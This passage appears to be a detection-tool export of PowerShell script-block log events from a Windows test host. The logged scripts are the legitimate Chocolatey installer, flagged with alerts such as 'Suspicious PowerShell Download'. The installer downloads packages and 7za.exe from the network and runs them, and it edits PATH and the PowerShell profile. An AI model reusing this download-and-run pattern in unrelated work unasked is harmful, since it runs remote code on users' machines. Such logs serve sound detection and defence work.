""chocolatey\chocInstall\chocolatey.zip"" Write-Debug ""First the zip file at '$chocoZipFile'."" Write-Debug ""Then from a neighboring chocolatey.*nupkg file '$thisScriptFolder/../../'."" if (Test-Path(""$chocoZipFile"")) { Write-Debug ""Copying '$chocoZipFile' to '$chocoPkgDirectory\chocolatey.nupkg'."" Copy-Item ""$chocoZipFile"" ""$chocoPkgDirectory\chocolatey.nupkg"" -Force -ErrorAction SilentlyContinue } if (!(Test-Path(""$chocoPkgDirectory\chocolatey.nupkg""))) { $chocoPkg = Get-ChildItem ""$thisScriptFolder/../../"" | ?{$_.name -match ""^chocolatey.*nupkg"" } | Sort name -Descending | Select -First 1 if ($chocoPkg -ne '') { $chocoPkg = $chocoPkg.FullName } ""$chocoZipFile"", ""$chocoPkg"" | % { if ($_ -ne $null -and $_ -ne '') { if (Test-Path $_) { Write-Debug ""Copying '$_' to '$chocoPkgDirectory\chocolatey.nupkg'."" Copy-Item $_ ""$chocoPkgDirectory\chocolatey.nupkg"" -Force -ErrorAction SilentlyContinue } } } } } } function Install-ChocolateyBinFiles { param( [string] $chocolateyPath, [string] $chocolateyExePath ) Write-Debug ""Install-ChocolateyBinFiles"" Write-Debug ""Installing the bin file redirects"" $redirectsPath = Join-Path $chocolateyPath 'redirects' if (!(Test-Path ""$redirectsPath"")) { Write-ChocolateyWarning ""$redirectsPath does not exist"" return } $exeFiles = Get-ChildItem ""$redirectsPath"" -include @(""*.exe"",""*.cmd"") -recurse foreach ($exeFile in $exeFiles) { $exeFilePath = $exeFile.FullName $exeFileName = [System.IO.Path]::GetFileName(""$exeFilePath"") $binFilePath = Join-Path $chocolateyExePath $exeFileName $binFilePathRename = $binFilePath + '.old' $batchFilePath = $binFilePath.Replace("".exe"","".bat"") $bashFilePath = $binFilePath.Replace("".exe"","""") if (Test-Path ($batchFilePath)) { Remove-Item $batchFilePath -force -ErrorAction SilentlyContinue } if (Test-Path ($bashFilePath)) { Remove-Item $bashFilePath -force -ErrorAction SilentlyContinue } if (Test-Path ($binFilePathRename)) { try { Write-Debug ""Attempting to remove $binFilePathRename"" Remove-Item $binFilePathRename -force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to remove `'$binFilePathRename`'. This may cause errors."" } } if (Test-Path ($binFilePath)) { try { Write-Debug ""Attempting to rename $binFilePath to $binFilePathRename"" Move-Item -path $binFilePath -destination $binFilePathRename -force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to rename `'$binFilePath`' to `'$binFilePathRename`'."" } } try { Write-Debug ""Attempting to copy $exeFilePath to $binFilePath"" Copy-Item -path $exeFilePath -destination $binFilePath -force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to replace `'$binFilePath`' with `'$exeFilePath`'. You may need to do this manually."" } $commandShortcut = [System.IO.Path]::GetFileNameWithoutExtension(""$exeFilePath"") Write-Debug ""Added command $commandShortcut"" } } function Initialize-ChocolateyPath { param( [string]$chocolateyExePath = ""$($env:ALLUSERSPROFILE)\chocolatey\bin"", [string]$chocolateyExePathVariable = ""%$($chocInstallVariableName)%\bin"" ) Write-Debug ""Initialize-ChocolateyPath"" Write-Debug ""Initializing Chocolatey Path if required"" $environmentTarget = [System.EnvironmentVariableTarget]::User if (Test-ProcessAdminRights) { Write-Debug ""Administrator installing so using Machine environment variable target instead of User."" $environmentTarget = [System.EnvironmentVariableTarget]::Machine } else { Write-ChocolateyWarning ""Setting ChocolateyInstall Path on USER PATH and not SYSTEM Path.`n This is due to either non-administrator install OR the process you are running is not being run as an Administrator."" } Install-ChocolateyPath -pathToInstall ""$chocolateyExePath"" -pathType $environmentTarget } function Process-ChocolateyBinFiles { param( [string]$chocolateyExePath = ""$($env:ALLUSERSPROFILE)\chocolatey\bin"", [string]$chocolateyExePathVariable = ""%$($chocInstallVariableName)%\bin"" ) Write-Debug ""Process-ChocolateyBinFiles"" $processedMarkerFile = Join-Path $chocolateyExePath '_processed.txt' if (!(test-path $processedMarkerFile)) { $files = get-childitem $chocolateyExePath -include *.bat -recurse if ($files -ne $null -and $files.Count -gt 0) { Write-Debug ""Processing Bin files"" foreach ($file in $files) { Write-Output ""Processing $($file.Name) to make it portable"" $fileStream = [System.IO.File]::Open(""$file"", 'Open', 'Read', 'ReadWrite') $reader = New-Object System.IO.StreamReader($fileStream) $fileText = $reader.ReadToEnd() $reader.Close() $fileStream.Close() $fileText = $fileText.ToLower().Replace(""`"""" + $chocolateyPath.ToLower(), ""SET DIR=%~dp0%`n""""%DIR%..\"").Replace(""\\"",""\"") Set-Content $file -Value $fileText -Encoding Ascii } } Set-Content $processedMarkerFile -Value ""$([System.DateTime]::Now.Date)"" -Encoding Ascii } } # Adapted from http://www.west-wind.com/Weblog/posts/197245.aspx function Get-FileEncoding($Path) { $bytes = [byte[]](Get-Content $Path -Encoding byte -ReadCount 4 -TotalCount 4) if(!$bytes) { return 'utf8' } switch -regex ('{0:x2}{1:x2}{2:x2}{3:x2}' -f $bytes[0],$bytes[1],$bytes[2],$bytes[3]) { '^efbbbf' { return 'utf8' } '^2b2f76' { return 'utf7' } '^fffe' { return 'unicode' } '^feff' { return 'bigendianunicode' } '^0000feff' { return 'utf32' } default { return 'ascii' } } } function Add-ChocolateyProfile { Write-Debug ""Add-ChocolateyProfile"" try { $profileFile = ""$profile"" if ($profileFile -eq $null -or $profileFile -eq '') { Write-Output 'Not setting tab completion: Profile variable ($profile) resulted in an empty string.' return } $profileDirectory = (Split-Path -Parent $profileFile) if ($env:ChocolateyNoProfile -ne $null -and $env:ChocolateyNoProfile -ne '') { Write-Warning ""Not setting tab completion: Environment variable ""ChocolateyNoProfile"" exists and is set."" return } $localSystem = Get-LocalizedWellKnownPrincipalName -WellKnownSidType ([Security.Principal.WellKnownSidType]::LocalSystemSid) # get current user $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent() if ($currentUser.Name -eq $localSystem) { Write-Warning ""Not setting tab completion: Current user is SYSTEM user."" return } if (!(Test-Path($profileDirectory))) { Write-Debug ""Creating '$profileDirectory'"" New-Item ""$profileDirectory"" -Type Directory -Force -ErrorAction SilentlyContinue | Out-Null } if (!(Test-Path($profileFile))) { Write-Warning ""Not setting tab completion: Profile file does not exist at '$profileFile'."" return #Write-Debug ""Creating '$profileFile'"" #"""" | Out-File $profileFile -Encoding UTF8 } # Check authenticode, but only if file is greater than 4 bytes $profileFileInfo = New-Object System.IO.FileInfo($profileFile) if ($profileFileInfo.Length -ge 5) { $signature = Get-AuthenticodeSignature $profile if ($signature.Status -ne 'NotSigned') { Write-Warning ""Not setting tab completion: File is Authenticode signed at '$profile'."" return } } $profileInstall = @' # Chocolatey profile $ChocolateyProfile = ""$env:ChocolateyInstall\helpers\chocolateyProfile.psm1"" if (Test-Path($ChocolateyProfile)) { Import-Module ""$ChocolateyProfile"" } '@ $chocoProfileSearch = '$ChocolateyProfile' if(Select-String -Path $profileFile -Pattern $chocoProfileSearch -Quiet -SimpleMatch) { Write-Debug ""Chocolatey profile is already installed."" return } Write-Output 'Adding Chocolatey to the profile. This will provide tab completion, refreshenv, etc.' $profileInstall | Out-File $profileFile -Append -Encoding (Get-FileEncoding $profileFile) Write-ChocolateyWarning 'Chocolatey profile installed. Reload your profile - type . $profile' if ($PSVersionTable.PSVersion.Major -lt 3) { Write-ChocolateyWar","13a97026-d21c-5c67-761d-537efe8f3fe7"
"2019-03-19 14:21:27.639 +01:00","Suspicious PowerShell Download - Powershell Script","med","MSEDGEWIN10","PwSh",4104,51,"ScriptBlock: # ===================================================================== # Copyright 2017 - Present Chocolatey Software, Inc, and the # original authors/contributors from ChocolateyGallery # Copyright 2011 - 2017 RealDimensions Software, LLC, and the # original authors/contributors from ChocolateyGallery # at https://github.com/chocolatey/chocolatey.org # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. # ===================================================================== # For organizational deployments of Chocolatey, please see https://chocolatey.org/docs/how-to-setup-offline-installation # Environment Variables, specified as $env:NAME in PowerShell.exe and %NAME% in cmd.exe. # For explicit proxy, please set $env:chocolateyProxyLocation and optionally $env:chocolateyProxyUser and $env:chocolateyProxyPassword # For an explicit version of Chocolatey, please set $env:chocolateyVersion = 'versionnumber' # To target a different url for chocolatey.nupkg, please set $env:chocolateyDownloadUrl = 'full url to nupkg file' # NOTE: $env:chocolateyDownloadUrl does not work with $env:chocolateyVersion. # To use built-in compression instead of 7zip (requires additional download), please set $env:chocolateyUseWindowsCompression = 'true' # To bypass the use of any proxy, please set $env:chocolateyIgnoreProxy = 'true' #specifically use the API to get the latest version (below) $url = '' $chocolateyVersion = $env:chocolateyVersion if (![string]::IsNullOrEmpty($chocolateyVersion)){ Write-Output ""Downloading specific version of Chocolatey: $chocolateyVersion"" $url = ""https://chocolatey.org/api/v2/package/chocolatey/$chocolateyVersion"" } $chocolateyDownloadUrl = $env:chocolateyDownloadUrl if (![string]::IsNullOrEmpty($chocolateyDownloadUrl)){ Write-Output ""Downloading Chocolatey from : $chocolateyDownloadUrl"" $url = ""$chocolateyDownloadUrl"" } if ($env:TEMP -eq $null) { $env:TEMP = Join-Path $env:SystemDrive 'temp' } $chocTempDir = Join-Path $env:TEMP ""chocolatey"" $tempDir = Join-Path $chocTempDir ""chocInstall"" if (![System.IO.Directory]::Exists($tempDir)) {[void][System.IO.Directory]::CreateDirectory($tempDir)} $file = Join-Path $tempDir ""chocolatey.zip"" # PowerShell v2/3 caches the output stream. Then it throws errors due # to the FileStream not being what is expected. Fixes ""The OS handle's # position is not what FileStream expected. Do not use a handle # simultaneously in one FileStream and in Win32 code or another # FileStream."" function Fix-PowerShellOutputRedirectionBug { $poshMajorVerion = $PSVersionTable.PSVersion.Major if ($poshMajorVerion -lt 4) { try{ # http://www.leeholmes.com/blog/2008/07/30/workaround-the-os-handles-position-is-not-what-filestream-expected/ plus comments $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetField"" $objectRef = $host.GetType().GetField(""externalHostRef"", $bindingFlags).GetValue($host) $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetProperty"" $consoleHost = $objectRef.GetType().GetProperty(""Value"", $bindingFlags).GetValue($objectRef, @()) [void] $consoleHost.GetType().GetProperty(""IsStandardOutputRedirected"", $bindingFlags).GetValue($consoleHost, @()) $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetField"" $field = $consoleHost.GetType().GetField(""standardOutputWriter"", $bindingFlags) $field.SetValue($consoleHost, [Console]::Out) [void] $consoleHost.GetType().GetProperty(""IsStandardErrorRedirected"", $bindingFlags).GetValue($consoleHost, @()) $field2 = $consoleHost.GetType().GetField(""standardErrorWriter"", $bindingFlags) $field2.SetValue($consoleHost, [Console]::Error) } catch { Write-Output ""Unable to apply redirection fix."" } } } Fix-PowerShellOutputRedirectionBug # Attempt to set highest encryption available for SecurityProtocol. # PowerShell will not set this by default (until maybe .NET 4.6.x). This # will typically produce a message for PowerShell v2 (just an info # message though) try { # Set TLS 1.2 (3072), then TLS 1.1 (768), then TLS 1.0 (192), finally SSL 3.0 (48) # Use integers because the enumeration values for TLS 1.2 and TLS 1.1 won't # exist in .NET 4.0, even though they are addressable if .NET 4.5+ is # installed (.NET 4.5 is an in-place upgrade). [System.Net.ServicePointManager]::SecurityProtocol = 3072 -bor 768 -bor 192 -bor 48 } catch { Write-Output 'Unable to set PowerShell to use TLS 1.2 and TLS 1.1 due to old .NET Framework installed. If you see underlying connection closed or trust errors, you may need to do one or more of the following: (1) upgrade to .NET Framework 4.5+ and PowerShell v3, (2) specify internal Chocolatey package location (set $env:chocolateyDownloadUrl prior to install or host the package internally), (3) use the Download + PowerShell method of install. See https://chocolatey.org/install for all install options.' } function Get-Downloader { param ( [string]$url ) $downloader = new-object System.Net.WebClient $defaultCreds = [System.Net.CredentialCache]::DefaultCredentials if ($defaultCreds -ne $null) { $downloader.Credentials = $defaultCreds } $ignoreProxy = $env:chocolateyIgnoreProxy if ($ignoreProxy -ne $null -and $ignoreProxy -eq 'true') { Write-Debug ""Explicitly bypassing proxy due to user environment variable"" $downloader.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy() } else { # check if a proxy is required $explicitProxy = $env:chocolateyProxyLocation $explicitProxyUser = $env:chocolateyProxyUser $explicitProxyPassword = $env:chocolateyProxyPassword if ($explicitProxy -ne $null -and $explicitProxy -ne '') { # explicit proxy $proxy = New-Object System.Net.WebProxy($explicitProxy, $true) if ($explicitProxyPassword -ne $null -and $explicitProxyPassword -ne '') { $passwd = ConvertTo-SecureString $explicitProxyPassword -AsPlainText -Force $proxy.Credentials = New-Object System.Management.Automation.PSCredential ($explicitProxyUser, $passwd) } Write-Debug ""Using explicit proxy server '$explicitProxy'."" $downloader.Proxy = $proxy } elseif (!$downloader.Proxy.IsBypassed($url)) { # system proxy (pass through) $creds = $defaultCreds if ($creds -eq $null) { Write-Debug ""Default credentials were null. Attempting backup method"" $cred = get-credential $creds = $cred.GetNetworkCredential(); } $proxyaddress = $downloader.Proxy.GetProxy($url).Authority Write-Debug ""Using system proxy server '$proxyaddress'."" $proxy = New-Object System.Net.WebProxy($proxyaddress) $proxy.Credentials = $creds $downloader.Proxy = $proxy } } return $downloader } function Download-String { param ( [string]$url ) $downloader = Get-Downloader $url return $downloader.DownloadString($url) } function Download-File { param ( [string]$url, [string]$file ) #Write-Output ""Downloading $url to $file"" $downloader = Get-Downloader $url $downloader.DownloadFile($url, $file) } if ($url -eq $null -or $url -eq '') { Write-Output ""Getting latest version of the Chocolatey package for download."" $url = 'https://chocolatey.org/api/v2/Packages()?$filter=((Id%20eq%20%27chocolatey%27)%20and%20(not%20IsPrerelease))%20and%20IsLatestVersion' [xml]$result = Download-String $url $url = $result.feed.entry.content.src } # Download the Chocolatey package Write-Output ""Getting Chocolatey from $url."" Download-File $url $file # Determine unzipping method # 7zip is the most compatible so use it by default $7zaExe = Join-Path $tempDir '7za.exe' $unzipMethod = '7zip' $useWindowsCompression = $env:chocolateyUseWindowsCompression if ($useWindowsCompression -ne $null -and $useWindowsCompression -eq 'true') { Write-Output 'Using built-in compression to unzip' $unzipMethod = 'builtin' } elseif (-Not (Test-Path ($7zaExe))) { Write-Output ""Downloading 7-Zip commandline tool prior to extraction."" # download 7zip Download-File 'https://chocolatey.org/7za.exe' ""$7zaExe"" } # unzip the package Write-Output ""Extracting $file to $tempDir..."" if ($unzipMethod -eq '7zip') { $params = ""x -o`""$tempDir`"" -bd -y `""$file`"""" # use more robust Process as compared to Start-Process -Wait (which doesn't # wait for the process to finish in PowerShell v3) $process = New-Object System.Diagnostics.Process $process.StartInfo = New-Object System.Diagnostics.ProcessStartInfo($7zaExe, $params) $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.UseShellExecute = $false $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden $process.Start() | Out-Null $process.BeginOutputReadLine() $process.WaitForExit() $exitCode = $process.ExitCode $process.Dispose() $errorMessage = ""Unable to unzip package using 7zip. Perhaps try setting `$env:chocolateyUseWindowsCompression = 'true' and call install again. Error:"" switch ($exitCode) { 0 { break } 1 { throw ""$errorMessage Some files could not be extracted"" } 2 { throw ""$errorMessage 7-Zip encountered a fatal error while extracting the files"" } 7 { throw ""$errorMessage 7-Zip command line error"" } 8 { throw ""$errorMessage 7-Zip out of memory"" } 255 { throw ""$errorMessage Extraction cancelled by the user"" } default { throw ""$errorMessage 7-Zip signalled an unknown error (code $exitCode)"" } } } else { if ($PSVersionTable.PSVersion.Major -lt 5) { try { $shellApplication = new-object -com shell.application $zipPackage = $shellApplication.NameSpace($file) $destinationFolder = $shellApplication.NameSpace($tempDir) $destinationFolder.CopyHere($zipPackage.Items(),0x10) } catch { throw ""Unable to unzip package using built-in compression. Set `$env:chocolateyUseWindowsCompression = 'false' and call install again to use 7zip to unzip. Error: `n $_"" } } else { Expand-Archive -Path ""$file"" -DestinationPath ""$tempDir"" -Force } } # Call chocolatey install Write-Output ""Installing chocolatey on this machine"" $toolsFolder = Join-Path $tempDir ""tools"" $chocInstallPS1 = Join-Path $toolsFolder ""chocolateyInstall.ps1"" & $chocInstallPS1 Write-Output 'Ensuring chocolatey commands are on the path' $chocInstallVariableName = ""ChocolateyInstall"" $chocoPath = [Environment]::GetEnvironmentVariable($chocInstallVariableName) if ($chocoPath -eq $null -or $chocoPath -eq '') { $chocoPath = ""$env:ALLUSERSPROFILE\Chocolatey"" } if (!(Test-Path ($chocoPath))) { $chocoPath = ""$env:SYSTEMDRIVE\ProgramData\Chocolatey"" } $chocoExePath = Join-Path $chocoPath 'bin' if ($($env:Path).ToLower().Contains($($chocoExePath).ToLower()) -eq $false) { $env:Path = [Environment]::GetEnvironmentVariable('Path',[System.EnvironmentVariableTarget]::Machine); } Write-Output 'Ensuring","MessageNumber: 1 ¦ MessageTotal: 2 ¦ Path: ¦ ScriptBlockId: e992c6bd-f3bf-42a3-80ea-9e74d03e44fe ¦ ScriptBlockText: # ===================================================================== # Copyright 2017 - Present Chocolatey Software, Inc, and the # original authors/contributors from ChocolateyGallery # Copyright 2011 - 2017 RealDimensions Software, LLC, and the # original authors/contributors from ChocolateyGallery # at https://github.com/chocolatey/chocolatey.org # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. # ===================================================================== # For organizational deployments of Chocolatey, please see https://chocolatey.org/docs/how-to-setup-offline-installation # Environment Variables, specified as $env:NAME in PowerShell.exe and %NAME% in cmd.exe. # For explicit proxy, please set $env:chocolateyProxyLocation and optionally $env:chocolateyProxyUser and $env:chocolateyProxyPassword # For an explicit version of Chocolatey, please set $env:chocolateyVersion = 'versionnumber' # To target a different url for chocolatey.nupkg, please set $env:chocolateyDownloadUrl = 'full url to nupkg file' # NOTE: $env:chocolateyDownloadUrl does not work with $env:chocolateyVersion. # To use built-in compression instead of 7zip (requires additional download), please set $env:chocolateyUseWindowsCompression = 'true' # To bypass the use of any proxy, please set $env:chocolateyIgnoreProxy = 'true' #specifically use the API to get the latest version (below) $url = '' $chocolateyVersion = $env:chocolateyVersion if (![string]::IsNullOrEmpty($chocolateyVersion)){ Write-Output ""Downloading specific version of Chocolatey: $chocolateyVersion"" $url = ""https://chocolatey.org/api/v2/package/chocolatey/$chocolateyVersion"" } $chocolateyDownloadUrl = $env:chocolateyDownloadUrl if (![string]::IsNullOrEmpty($chocolateyDownloadUrl)){ Write-Output ""Downloading Chocolatey from : $chocolateyDownloadUrl"" $url = ""$chocolateyDownloadUrl"" } if ($env:TEMP -eq $null) { $env:TEMP = Join-Path $env:SystemDrive 'temp' } $chocTempDir = Join-Path $env:TEMP ""chocolatey"" $tempDir = Join-Path $chocTempDir ""chocInstall"" if (![System.IO.Directory]::Exists($tempDir)) {[void][System.IO.Directory]::CreateDirectory($tempDir)} $file = Join-Path $tempDir ""chocolatey.zip"" # PowerShell v2/3 caches the output stream. Then it throws errors due # to the FileStream not being what is expected. Fixes ""The OS handle's # position is not what FileStream expected. Do not use a handle # simultaneously in one FileStream and in Win32 code or another # FileStream."" function Fix-PowerShellOutputRedirectionBug { $poshMajorVerion = $PSVersionTable.PSVersion.Major if ($poshMajorVerion -lt 4) { try{ # http://www.leeholmes.com/blog/2008/07/30/workaround-the-os-handles-position-is-not-what-filestream-expected/ plus comments $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetField"" $objectRef = $host.GetType().GetField(""externalHostRef"", $bindingFlags).GetValue($host) $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetProperty"" $consoleHost = $objectRef.GetType().GetProperty(""Value"", $bindingFlags).GetValue($objectRef, @()) [void] $consoleHost.GetType().GetProperty(""IsStandardOutputRedirected"", $bindingFlags).GetValue($consoleHost, @()) $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetField"" $field = $consoleHost.GetType().GetField(""standardOutputWriter"", $bindingFlags) $field.SetValue($consoleHost, [Console]::Out) [void] $consoleHost.GetType().GetProperty(""IsStandardErrorRedirected"", $bindingFlags).GetValue($consoleHost, @()) $field2 = $consoleHost.GetType().GetField(""standardErrorWriter"", $bindingFlags) $field2.SetValue($consoleHost, [Console]::Error) } catch { Write-Output ""Unable to apply redirection fix."" } } } Fix-PowerShellOutputRedirectionBug # Attempt to set highest encryption available for SecurityProtocol. # PowerShell will not set this by default (until maybe .NET 4.6.x). This # will typically produce a message for PowerShell v2 (just an info # message though) try { # Set TLS 1.2 (3072), then TLS 1.1 (768), then TLS 1.0 (192), finally SSL 3.0 (48) # Use integers because the enumeration values for TLS 1.2 and TLS 1.1 won't # exist in .NET 4.0, even though they are addressable if .NET 4.5+ is # installed (.NET 4.5 is an in-place upgrade). [System.Net.ServicePointManager]::SecurityProtocol = 3072 -bor 768 -bor 192 -bor 48 } catch { Write-Output 'Unable to set PowerShell to use TLS 1.2 and TLS 1.1 due to old .NET Framework installed. If you see underlying connection closed or trust errors, you may need to do one or more of the following: (1) upgrade to .NET Framework 4.5+ and PowerShell v3, (2) specify internal Chocolatey package location (set $env:chocolateyDownloadUrl prior to install or host the package internally), (3) use the Download + PowerShell method of install. See https://chocolatey.org/install for all install options.' } function Get-Downloader { param ( [string]$url ) $downloader = new-object System.Net.WebClient $defaultCreds = [System.Net.CredentialCache]::DefaultCredentials if ($defaultCreds -ne $null) { $downloader.Credentials = $defaultCreds } $ignoreProxy = $env:chocolateyIgnoreProxy if ($ignoreProxy -ne $null -and $ignoreProxy -eq 'true') { Write-Debug ""Explicitly bypassing proxy due to user environment variable"" $downloader.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy() } else { # check if a proxy is required $explicitProxy = $env:chocolateyProxyLocation $explicitProxyUser = $env:chocolateyProxyUser $explicitProxyPassword = $env:chocolateyProxyPassword if ($explicitProxy -ne $null -and $explicitProxy -ne '') { # explicit proxy $proxy = New-Object System.Net.WebProxy($explicitProxy, $true) if ($explicitProxyPassword -ne $null -and $explicitProxyPassword -ne '') { $passwd = ConvertTo-SecureString $explicitProxyPassword -AsPlainText -Force $proxy.Credentials = New-Object System.Management.Automation.PSCredential ($explicitProxyUser, $passwd) } Write-Debug ""Using explicit proxy server '$explicitProxy'."" $downloader.Proxy = $proxy } elseif (!$downloader.Proxy.IsBypassed($url)) { # system proxy (pass through) $creds = $defaultCreds if ($creds -eq $null) { Write-Debug ""Default credentials were null. Attempting backup method"" $cred = get-credential $creds = $cred.GetNetworkCredential(); } $proxyaddress = $downloader.Proxy.GetProxy($url).Authority Write-Debug ""Using system proxy server '$proxyaddress'."" $proxy = New-Object System.Net.WebProxy($proxyaddress) $proxy.Credentials = $creds $downloader.Proxy = $proxy } } return $downloader } function Download-String { param ( [string]$url ) $downloader = Get-Downloader $url return $downloader.DownloadString($url) } function Download-File { param ( [string]$url, [string]$file ) #Write-Output ""Downloading $url to $file"" $downloader = Get-Downloader $url $downloader.DownloadFile($url, $file) } if ($url -eq $null -or $url -eq '') { Write-Output ""Getting latest version of the Chocolatey package for download."" $url = 'https://chocolatey.org/api/v2/Packages()?$filter=((Id%20eq%20%27chocolatey%27)%20and%20(not%20IsPrerelease))%20and%20IsLatestVersion' [xml]$result = Download-String $url $url = $result.feed.entry.content.src } # Download the Chocolatey package Write-Output ""Getting Chocolatey from $url."" Download-File $url $file # Determine unzipping method # 7zip is the most compatible so use it by default $7zaExe = Join-Path $tempDir '7za.exe' $unzipMethod = '7zip' $useWindowsCompression = $env:chocolateyUseWindowsCompression if ($useWindowsCompression -ne $null -and $useWindowsCompression -eq 'true') { Write-Output 'Using built-in compression to unzip' $unzipMethod = 'builtin' } elseif (-Not (Test-Path ($7zaExe))) { Write-Output ""Downloading 7-Zip commandline tool prior to extraction."" # download 7zip Download-File 'https://chocolatey.org/7za.exe' ""$7zaExe"" } # unzip the package Write-Output ""Extracting $file to $tempDir..."" if ($unzipMethod -eq '7zip') { $params = ""x -o`""$tempDir`"" -bd -y `""$file`"""" # use more robust Process as compared to Start-Process -Wait (which doesn't # wait for the process to finish in PowerShell v3) $process = New-Object System.Diagnostics.Process $process.StartInfo = New-Object System.Diagnostics.ProcessStartInfo($7zaExe, $params) $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.UseShellExecute = $false $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden $process.Start() | Out-Null $process.BeginOutputReadLine() $process.WaitForExit() $exitCode = $process.ExitCode $process.Dispose() $errorMessage = ""Unable to unzip package using 7zip. Perhaps try setting `$env:chocolateyUseWindowsCompression = 'true' and call install again. Error:"" switch ($exitCode) { 0 { break } 1 { throw ""$errorMessage Some files could not be extracted"" } 2 { throw ""$errorMessage 7-Zip encountered a fatal error while extracting the files"" } 7 { throw ""$errorMessage 7-Zip command line error"" } 8 { throw ""$errorMessage 7-Zip out of memory"" } 255 { throw ""$errorMessage Extraction cancelled by the user"" } default { throw ""$errorMessage 7-Zip signalled an unknown error (code $exitCode)"" } } } else { if ($PSVersionTable.PSVersion.Major -lt 5) { try { $shellApplication = new-object -com shell.application $zipPackage = $shellApplication.NameSpace($file) $destinationFolder = $shellApplication.NameSpace($tempDir) $destinationFolder.CopyHere($zipPackage.Items(),0x10) } catch { throw ""Unable to unzip package using built-in compression. Set `$env:chocolateyUseWindowsCompression = 'false' and call install again to use 7zip to unzip. Error: `n $_"" } } else { Expand-Archive -Path ""$file"" -DestinationPath ""$tempDir"" -Force } } # Call chocolatey install Write-Output ""Installing chocolatey on this machine"" $toolsFolder = Join-Path $tempDir ""tools"" $chocInstallPS1 = Join-Path $toolsFolder ""chocolateyInstall.ps1"" & $chocInstallPS1 Write-Output 'Ensuring chocolatey commands are on the path' $chocInstallVariableName = ""ChocolateyInstall"" $chocoPath = [Environment]::GetEnvironmentVariable($chocInstallVariableName) if ($chocoPath -eq $null -or $chocoPath -eq '') { $chocoPath = ""$env:ALLUSERSPROFILE\Chocolatey"" } if (!(Test-Path ($chocoPath))) { $chocoPath = ""$env:SYSTEMDRIVE\ProgramData\Chocolatey"" } $chocoExePath = Join-Path $chocoPath 'bin' if ($($env:Path).ToLower().Contains($($chocoExePath).ToLower()) -eq $false) { $env:Path = [Environment]::GetEnvironmentVariable('Path',[System.EnvironmentVariableTarget]::Machine); } Write-Output 'Ensuring","e3888b82-f1d3-14e8-54e5-16b522dfd8a9"
"2019-03-19 14:21:31.332 +01:00","Extracting Information with PowerShell","med","MSEDGEWIN10","PwSh",4104,54,"ScriptBlock: )?', '', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase) if ($updatedPath -ne $path) { Write-Output ""Updating `'$_`' PATH to reflect removal of '$chocolateyPathOld'."" try { Set-EnvironmentVariable -Name 'Path' -Value $updatedPath -Scope $_ -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to remove the old environment variable from PATH. You will need to do this manually"" } } } Copy-Item ""$chocolateyPathOld\lib\*"" ""$chocolateyPath\lib"" -force -recurse $from = ""$chocolateyPathOld\bin"" $to = ""$chocolateyPath\bin"" $exclude = @(""choco.exe"", ""chocolatey.exe"", ""cinst.exe"", ""clist.exe"", ""cpack.exe"", ""cpush.exe"", ""cuninst.exe"", ""cup.exe"", ""cver.exe"", ""RefreshEnv.cmd"") Get-ChildItem -Path $from -recurse -Exclude $exclude | % { Write-Debug ""Copying $_ `n to $to"" if ($_.PSIsContainer) { Copy-Item $_ -Destination (Join-Path $to $_.Parent.FullName.Substring($from.length)) -Force -ErrorAction SilentlyContinue } else { $fileToMove = (Join-Path $to $_.FullName.Substring($from.length)) try { Copy-Item $_ -Destination $fileToMove -Exclude $exclude -Force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to move `'$fileToMove`'. You may need to reinstall the shim"" } } } } } function Remove-OldChocolateyInstall { param( [string]$chocolateyPathOld = ""$sysDrive\Chocolatey"" ) Write-Debug ""Remove-OldChocolateyInstall"" if (Test-Path $chocolateyPathOld) { Write-ChocolateyWarning ""This action will result in Log Errors, you can safely ignore those. `n You may need to finish removing '$chocolateyPathOld' manually."" try { Get-ChildItem -Path ""$chocolateyPathOld"" | % { if (Test-Path $_.FullName) { Write-Debug ""Removing $_ unless matches .log"" Remove-Item $_.FullName -exclude *.log -recurse -force -ErrorAction SilentlyContinue } } Write-Output ""Attempting to remove `'$chocolateyPathOld`'. This may fail if something in the folder is being used or locked."" Remove-Item ""$($chocolateyPathOld)"" -force -recurse -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to remove `'$chocolateyPathOld`'. You will need to manually remove it."" } } } function Install-ChocolateyFiles { param( [string]$chocolateyPath ) Write-Debug ""Install-ChocolateyFiles"" Write-Debug ""Removing install files in chocolateyInstall, helpers, redirects, and tools"" ""$chocolateyPath\chocolateyInstall"", ""$chocolateyPath\helpers"", ""$chocolateyPath\redirects"", ""$chocolateyPath\tools"" | % { #Write-Debug ""Checking path $_"" if (Test-Path $_) { Get-ChildItem -Path ""$_"" | % { #Write-Debug ""Checking child path $_ ($($_.FullName))"" if (Test-Path $_.FullName) { Write-Debug ""Removing $_ unless matches .log"" Remove-Item $_.FullName -exclude *.log -recurse -force -ErrorAction SilentlyContinue } } } } Write-Debug ""Attempting to move choco.exe to 